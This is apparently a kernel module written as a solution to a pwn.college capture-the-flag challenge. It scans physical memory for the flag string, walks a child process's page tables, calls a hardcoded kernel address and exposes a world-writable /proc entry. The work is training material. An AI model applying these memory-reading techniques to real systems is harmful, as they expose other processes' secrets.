#include "asm/page_types.h"
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <asm/pgtable.h>
#include <asm/current.h>
//#include <asm/page_types.h>

MODULE_LICENSE("GPL");

static int debug_device_open(struct inode *inode, struct file *filp)
{
    printk(KERN_ALERT "Device opened.");
  	return 0;
}

static int debug_device_release(struct inode *inode, struct file *filp)
{
    printk(KERN_ALERT "Device closed.");
  	return 0;
}

static ssize_t debug_device_read(struct file *filp, char *buffer, 
                                 size_t length, loff_t *offset)
{
	char *msg = "Hello pwn-college!\n";
	return copy_to_user(buffer, msg, strlen(msg)) ? -EFAULT : 0;
}

#define USERSPACE_ADDR  0x404040
#define PHYSMEM_END     PAGE_OFFSET + ((1ull << 30)) * 2
#define STR_START       "pwn.college{"

ulong get_flag_location(void)
{
    void*  cont = current->children.next;
	struct task_struct* child = container_of(cont, struct task_struct, sibling);

	size_t addr = USERSPACE_ADDR >> 12;
 	register size_t walk = (size_t)child->mm->pgd;

	int i;
	for (i = 3; i >= 0; i--) 
	{
		walk = *(size_t*)((walk & ~0xfff) + ((addr >> (9 * i)) & 0x1ff)*8);
		walk &= ~((1<<12)-1) & ((1ull<<51) - 1);
		walk += PAGE_OFFSET;
	}

	return walk + (USERSPACE_ADDR & 0xfff);
}


static ssize_t debug_device_write(struct file *filp, const char *buf, 
                                  size_t len, loff_t *off)
{
	asm volatile(
		"movq $0xffffffff810bc8e0, %rax\n"
    	"call %rax\n"
	);

    register ulong ptr = PAGE_OFFSET;
    for (; ptr < PHYSMEM_END; ptr += PAGE_SIZE)
    {
        if (!memcmp((char*)(ptr + (USERSPACE_ADDR & 0xfff)), 
                    STR_START, sizeof STR_START-1)) 
            return _copy_to_user(0x31337000, (char*)(ptr + (USERSPACE_ADDR & 0xfff)), 128);
    }
    
    /*
    if (found) {
        pr_info("Found str: %.100s\n", (char*)ptr + (USERSPACE_ADDR & 0xfff));
    }
    else {
        pr_info("Str not found!\n");
    }
    */

  	return len;
}


static struct file_operations fops = {
  	.read = debug_device_read,
  	.write = debug_device_write,
  	.open = debug_device_open,
  	.release = debug_device_release
};

struct proc_dir_entry *proc_entry = NULL;


int init_module(void)
{
  	proc_entry = proc_create("pwncollege", 0666, NULL, &fops);
    printk(KERN_ALERT "/proc/pwn-college-char created!");
  	return 0;
}

void cleanup_module(void)
{
    	if (proc_entry) proc_remove(proc_entry);                                                                                             
    	printk(KERN_ALERT "/proc/pwn-college-char removed!");
}

